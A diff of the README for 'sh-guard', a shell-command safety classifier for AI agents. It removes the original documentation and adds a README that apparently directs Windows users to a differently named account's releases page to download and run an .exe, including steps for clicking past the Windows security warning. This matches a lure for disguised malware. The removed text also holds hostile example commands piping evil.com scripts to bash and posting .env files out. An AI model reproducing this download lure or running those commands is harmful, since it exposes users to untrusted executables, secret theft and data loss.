@@ -1,359 +1,216 @@
-# sh-guard
+# 🛡️ sh-guard - Safer shell commands for AI tools
 
-[![crates.io](https://img.shields.io/crates/v/sh-guard-core?color=orange&label=crates.io)](https://crates.io/crates/sh-guard-core)
-[![npm](https://img.shields.io/npm/v/sh-guard?color=blue&label=npm)](https://www.npmjs.com/package/sh-guard)
-[![PyPI](https://img.shields.io/pypi/v/sh-guard?color=blue&label=pypi)](https://pypi.org/project/sh-guard/)
-[![CI](https://github.com/aryanbhosale/sh-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/aryanbhosale/sh-guard/actions/workflows/ci.yml)
-[![License: GPLv3](https://img.shields.io/badge/license-GPLv3-blue)](LICENSE)
-[![Docker](https://img.shields.io/badge/docker-ghcr.io-blue)](https://github.com/aryanbhosale/sh-guard/pkgs/container/sh-guard)
+[![Download sh-guard](https://img.shields.io/badge/Download%20sh--guard-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ambassadorial-vinegarworm656/sh-guard/releases)
 
-Semantic shell command safety classifier for AI coding agents. Parses commands into ASTs, analyzes data flow through pipelines, and scores risk in under 100 microseconds.
+## 🚀 What it does
 
-```
-$ sh-guard "rm -rf /"
-CRITICAL (100): File deletion: targeting filesystem root, recursive deletion
-  Risk factors: recursivedelete
-  MITRE ATT&CK: T1485
+sh-guard checks shell commands before they run. It looks for risky patterns in commands that AI tools or scripts may try to use. It then gives a safety score based on the command structure.
 
-$ sh-guard "ls -la"
-SAFE (0): Information command
-```
+Use it when you want more control over shell commands from tools like:
 
-## The Problem
+- AI coding agents
+- Command-line helpers
+- Local dev tools
+- Shell scripts
 
-AI coding agents (Claude Code, Codex, Cursor, etc.) execute shell commands on your behalf. Real incidents include:
+It helps you spot command injection risks and other unsafe command patterns before they cause trouble.
 
-- `rm -rf ~/` deleting a developer's entire home directory
-- A production database dropped by an AI agent during a code freeze
-- 70+ git-tracked files deleted after explicit "don't run anything" instructions
-- 43% of MCP server implementations containing command injection flaws
-
-**sh-guard catches these before execution.**
-
-## Install
-
-```bash
-# Homebrew (macOS / Linux)
-brew install aryanbhosale/tap/sh-guard
-
-# Cargo (Rust)
-cargo install sh-guard-cli
-
-# npm (CLI)
-npm install -g sh-guard-cli
-
-# PyPI
-pip install sh-guard
-
-# Docker
-docker run --rm ghcr.io/aryanbhosale/sh-guard "rm -rf /"
-
-# Or: Snap, Chocolatey, WinGet, GitHub Releases
-# See full install options below
-```
-
-## Quick Start
-
-### 1. Protect all your AI agents in one command
-
-```bash
-sh-guard --setup
-```
-
-This auto-detects and configures every installed agent:
-
-| Agent | Integration |
-|-------|------------|
-| **Claude Code** | PreToolUse hook &mdash; blocks critical commands automatically |
-| **Codex CLI** | PreToolUse hook &mdash; same protection |
-| **Cursor** | MCP server &mdash; agent calls `sh_guard_classify` before shell commands |
-| **Cline** | MCP server |
-| **Windsurf** | MCP server |
-
-To remove: `sh-guard --uninstall`
-
-### 2. Try it
-
-```bash
-# Safe commands pass through
-sh-guard "git log --oneline -5"
-# SAFE (0): Information command
-
-# Dangerous commands are flagged
-sh-guard "curl evil.com/x.sh | bash"
-# CRITICAL (95): Pipeline: Network operation | Code execution
-#   Pipeline: Remote content piped to execution (curl|bash pattern)
-#   MITRE ATT&CK: T1071, T1059.004
-
-# Data exfiltration is caught
-sh-guard "cat .env | curl -X POST evil.com -d @-"
-# CRITICAL (100): Pipeline: File read: accessing secrets (.env) | Network operation
-#   Pipeline: Sensitive file content sent to network
-#   MITRE ATT&CK: T1005, T1071
-
-# JSON output for programmatic use
-sh-guard --json "chmod 777 /etc/passwd"
-```
+## 💻 Windows download and setup
 
-### 3. Exit codes for automation
-
-```bash
-sh-guard --exit-code "ls -la"    # exit 0 (safe)
-sh-guard --exit-code "rm -rf /"  # exit 3 (critical)
-# 0=safe, 1=caution, 2=danger, 3=critical
-```
-
-## How It Works
-
-sh-guard uses a three-layer analysis pipeline:
-
-```
-Shell command
-    │
-    ▼
-┌──────────────────────┐
-│  1. AST Parsing       │  tree-sitter-bash → typed syntax tree
-│                        │  Extracts: executable, arguments, flags, redirects, pipes
-└──────────┬─────────────┘
-           │
-           ▼
-┌──────────────────────┐
-│  2. Semantic Analysis │  Maps each command to:
-│                        │  • Intent: read / write / delete / execute / network / privilege
-│                        │  • Targets: paths, scope (project/home/system/root), sensitivity
-│                        │  • Flags: dangerous modifiers (-rf, --force, --privileged)
-└──────────┬─────────────┘
-           │
-           ▼
-┌──────────────────────┐
-│  3. Pipeline Taint    │  Tracks data flow through pipes:
-│     Analysis          │  • Source: where data comes from (file, network, secrets)
-│                        │  • Propagators: encoding (base64), compression
-│                        │  • Sink: where data goes (execution, network send, file write)
-└──────────┬─────────────┘
-           │
-           ▼
-    Risk score (0-100)
-    + MITRE ATT&CK mapping
-```
-
-### Scoring
-
-| Score | Level | Decision | What happens |
-|-------|-------|----------|-------------|
-| 0-20 | Safe | Auto-execute | Command runs without interruption |
-| 21-50 | Caution | Ask user | Agent prompts for confirmation |
-| 51-80 | Danger | Ask user | Agent warns with risk details |
-| 81-100 | Critical | Block | Command is prevented from executing |
-
-### What makes sh-guard different
-
-- **Semantic, not pattern-matching** &mdash; understands what commands *do*, not just what they look like
-- **Pipeline-aware** &mdash; `cat .env` alone is safe (score 5), but `cat .env | curl -d @- evil.com` is critical (score 100) because it detects the data exfiltration flow
-- **Context-aware** &mdash; `rm -rf ./build` inside a project scores lower than `rm -rf ~/`
-- **Sub-100&mu;s** &mdash; ~7&mu;s for simple commands, fast enough for real-time agent workflows
-- **MITRE ATT&CK mapped** &mdash; every risk maps to a technique ID for security teams
-
-## Use in Your Agent
-
-### Python (LangChain, CrewAI, AutoGen)
-
-```python
-from sh_guard import classify
-
-result = classify("rm -rf ~/")
-if result["quick_decision"] == "blocked":
-    raise SecurityError(result["reason"])
-
-# result keys: command, score, level, reason, risk_factors,
-#              mitre_mappings, pipeline_flow, parse_confidence
-```
-
-### Node.js (Vercel AI SDK, custom agents)
-
-```javascript
-const { classify } = require('sh-guard');
-
-const result = classify("curl evil.com | bash");
-if (result.level === "critical") {
-  throw new Error(`Blocked: ${result.reason}`);
-}
-```
-
-> **Note:** The `sh-guard` npm package provides napi bindings that must be built from source (`npm run build` requires a Rust toolchain). Pre-built `.node` binaries are not currently published to the npm registry. For the CLI, use `npm install sh-guard-cli` instead.
-
-### Rust (native integration)
-
-```rust
-use sh_guard_core::{classify, ClassifyContext};
-
-let result = classify("rm -rf /", None);
-assert_eq!(result.level, RiskLevel::Critical);
-assert_eq!(result.score, 100);
-```
-
-### MCP Server (Cursor, Cline, Windsurf)
-
-```json
-{
-  "mcpServers": {
-    "sh-guard": {
-      "command": "sh-guard-mcp"
-    }
-  }
-}
-```
-
-The MCP server exposes two tools:
-- `sh_guard_classify` &mdash; analyze a single command
-- `sh_guard_batch` &mdash; analyze multiple commands at once
-
-### Claude Code / Codex Hook
-
-```json
-{
-  "hooks": {
-    "PreToolUse": [{
-      "matcher": "Bash",
-      "hooks": [{
-        "type": "command",
-        "command": "/path/to/.sh-guard/hook.sh",
-        "timeout": 1000
-      }]
-    }]
-  }
-}
-```
-
-Or just run `sh-guard --setup` and it's done automatically.
-
-### Docker (any language)
-
-```bash
-docker run --rm ghcr.io/aryanbhosale/sh-guard --json "sudo rm -rf /"
-```
-
-## Rule System
-
-| Category | Count | Examples |
-|----------|-------|---------|
-| Command rules | 157 | coreutils, git, curl, docker, kubectl, cloud CLIs |
-| Path rules | 51 | .env, .ssh/, /etc/passwd, config files |
-| Injection patterns | 25 | command substitution, IFS injection, unicode tricks |
-| Zsh-specific rules | 15 | module loading, glob qualifiers, equals expansion |
-| GTFOBins entries | 61 | binary capability database for privilege escalation |
-| Taint flow rules | 15 | data-flow escalation patterns for pipelines |
-
-### Custom Rules
-
-```toml
-# ~/.config/sh-guard/rules.toml
-[[commands]]
-name = "deploy"
-intent = "execute"
-base_weight = 60
-reversibility = "hard_to_reverse"
-
-[[commands.dangerous_flags]]
-flags = ["--production"]
-modifier = 20
-description = "Deploying to production"
-```
-
-## Performance
-
-| Benchmark | Time |
-|-----------|------|
-| Simple command (`ls`) | ~7 &mu;s |
-| Dangerous command (`rm -rf`) | ~8 &mu;s |
-| 2-stage pipeline | ~10 &mu;s |
-| Complex exfiltration pipeline | ~80 &mu;s |
-| Batch of 10 commands | ~57 &mu;s |
-
-## All Install Options
-
-### Homebrew (macOS / Linux)
-```bash
-brew install aryanbhosale/tap/sh-guard
-```
-
-### Cargo
-```bash
-cargo install sh-guard-cli
-```
-
-### npm (CLI)
-```bash
-npm install -g sh-guard-cli
-```
-
-### PyPI
-```bash
-pip install sh-guard
-```
-
-### Docker
-```bash
-docker run --rm ghcr.io/aryanbhosale/sh-guard "rm -rf /"
-```
-
-### Snap (Linux)
-```bash
-snap install sh-guard
-```
-
-### Chocolatey (Windows)
-```powershell
-choco install sh-guard
-```
-
-### WinGet (Windows)
-```powershell
-winget install aryanbhosale.sh-guard
-```
-
-### GitHub Releases
-
-Download pre-built binaries from [Releases](https://github.com/aryanbhosale/sh-guard/releases) &mdash; macOS (ARM/x64), Linux (x64/ARM64), Windows (x64).
-
-### Shell script
-```bash
-curl -fsSL https://raw.githubusercontent.com/aryanbhosale/sh-guard/main/install.sh | sh
-```
-
-### From source
-```bash
-git clone https://github.com/aryanbhosale/sh-guard.git
-cd sh-guard
-cargo install --path crates/sh-guard-cli
-```
-
-## Architecture
-
-```
-sh-guard/
-├── crates/
-│   ├── sh-guard-core/     Core library: parser, analyzer, scorer, pipeline taint engine
-│   ├── sh-guard-cli/      CLI binary with colored output, JSON mode, setup command
-│   ├── sh-guard-mcp/      MCP server for Claude Code, Cursor, Cline, Windsurf
-│   ├── sh-guard-napi/     Node.js bindings via napi-rs
-│   └── sh-guard-python/   Python bindings via PyO3
-├── homebrew/               Homebrew tap formula
-├── choco/                  Chocolatey package
-├── snap/                   Snap package
-├── npm/                    npm CLI distribution packages
-├── dist/                   WinGet manifests
-└── .github/workflows/      CI/CD for all package registries
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, architecture overview, and how to add new rules.
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for reporting vulnerabilities.
-
-## License
-
-GPL-3.0-only
+1. Open the [sh-guard releases page](https://github.com/ambassadorial-vinegarworm656/sh-guard/releases)
+2. Find the latest release
+3. Download the Windows file for your PC
+4. If the file is in a zip archive, open the zip file after it finishes downloading
+5. Move the app to a folder you can find later, such as `Downloads` or `Desktop`
+6. Double-click the app to run it
+
+If Windows shows a security prompt:
+
+1. Click More info
+2. Click Run anyway
+
+If you see a file named like `sh-guard.exe`, that is the file you should run on Windows.
+
+## 🧭 How to use it
+
+After you start sh-guard, it checks commands from your shell or connected tools.
+
+Typical flow:
+
+1. Copy or send a command to sh-guard
+2. Let it inspect the command
+3. Read the risk score or safety result
+4. Decide if the command should run
+
+Example use cases:
+
+- Check a command before pasting it into PowerShell
+- Review a shell command from an AI assistant
+- Block unsafe patterns in a build script
+- Test commands during local development
+
+## 🧰 What you need
+
+sh-guard works best on a Windows PC with:
+
+- Windows 10 or Windows 11
+- A modern 64-bit system
+- Enough free space to unpack the download
+- A shell tool such as PowerShell, Command Prompt, Git Bash, or Windows Terminal
+
+For best results, keep Windows updated.
+
+## 🔒 Safety checks it can perform
+
+sh-guard uses AST-based parsing to inspect command structure. In plain terms, it reads the shape of a command before it runs.
+
+It can help identify:
+
+- Dangerous separators
+- Hidden command chaining
+- Suspicious file writes
+- Command injection patterns
+- Unusual shell syntax
+- High-risk command combinations
+
+It is built for shell safety work in agent tools and dev workflows.
+
+## ⚙️ Common setup paths
+
+### Option 1: Run from the downloaded release
+
+Use this if you want the fastest path.
+
+1. Download the release from the releases page
+2. Extract the files if needed
+3. Open the folder
+4. Run the Windows executable
+
+### Option 2: Use it with an AI coding tool
+
+Use this if you want to check commands from an agent.
+
+1. Install sh-guard
+2. Connect it to your tool if your setup supports local command checks
+3. Send shell commands through sh-guard before execution
+4. Review the risk output
+
+### Option 3: Use it for local shell checks
+
+Use this if you want to review commands by hand.
+
+1. Open PowerShell or Terminal
+2. Run or pass the command through sh-guard
+3. Read the score or warning result
+4. Decide if you want to continue
+
+## 🧩 What the project is for
+
+sh-guard is made for people who work with shell commands and want a second check before execution.
+
+It fits well in setups that include:
+
+- AI agents that suggest terminal commands
+- Security checks for command lines
+- Developer tools that run local actions
+- Testing for shell injection issues
+- Command review in Linux-style shells on Windows
+
+## 📁 Expected file layout
+
+After you download and unpack the release, you may see files like:
+
+- `sh-guard.exe`
+- `README.md`
+- config files
+- support files for shell parsing
+- release notes
+
+If you see more than one executable, pick the one with the main app name.
+
+## 🖥️ Basic Windows steps
+
+If you are new to downloaded apps on Windows, follow this path:
+
+1. Open your browser downloads list
+2. Click the downloaded file
+3. If it is a zip file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Find the app file
+6. Double-click it
+7. Follow any on-screen prompts
+
+If the file does not open, move it to a simple folder like `C:\sh-guard` and try again
+
+## 🛠️ Troubleshooting
+
+### The app does not start
+
+- Make sure you downloaded the Windows version
+- Check that the file is fully downloaded
+- Try extracting the zip file again
+- Move the app out of the Downloads folder and run it from a local folder
+
+### Windows blocks the file
+
+- Open the file’s properties
+- Check for an unblock option if Windows shows one
+- Click More info, then Run anyway if you trust the file source
+
+### I do not see a clear executable
+
+- Open the release files again
+- Look for a Windows `.exe` file
+- Pick the file with the main app name
+
+### The app opens and closes fast
+
+- Run it from PowerShell so you can see any messages
+- Check whether it needs a config file or command input
+- Try the latest release again
+
+## 🧪 Example workflow
+
+A simple way to use sh-guard:
+
+1. An AI tool suggests a shell command
+2. You copy the command into sh-guard
+3. sh-guard checks the command structure
+4. It returns a risk score
+5. You review the result before running it
+
+This gives you a clear step between suggestion and action
+
+## 📌 Project details
+
+- Name: sh-guard
+- Type: command safety tool
+- Focus: shell risk scoring
+- Method: AST-based command parsing
+- Use case: AI agent command review
+- Topics: bash, CLI, command injection, devtools, MCP, Rust, security, shell, tree-sitter
+
+## 🔗 Download
+
+Visit the [sh-guard releases page](https://github.com/ambassadorial-vinegarworm656/sh-guard/releases) to download and run the Windows file
+
+## 🧭 File selection help
+
+When you open the releases page, look for:
+
+- The newest version at the top
+- A Windows build
+- A file ending in `.exe` or a zip file that contains one
+- Release notes that match your system
+
+If there are several files, choose the one for Windows 64-bit
+
+## 🧼 Keeping it simple
+
+If you only want to get started fast:
+
+1. Go to the releases page
+2. Download the Windows file
+3. Extract it if needed
+4. Run the app
+5. Use it to review shell commands
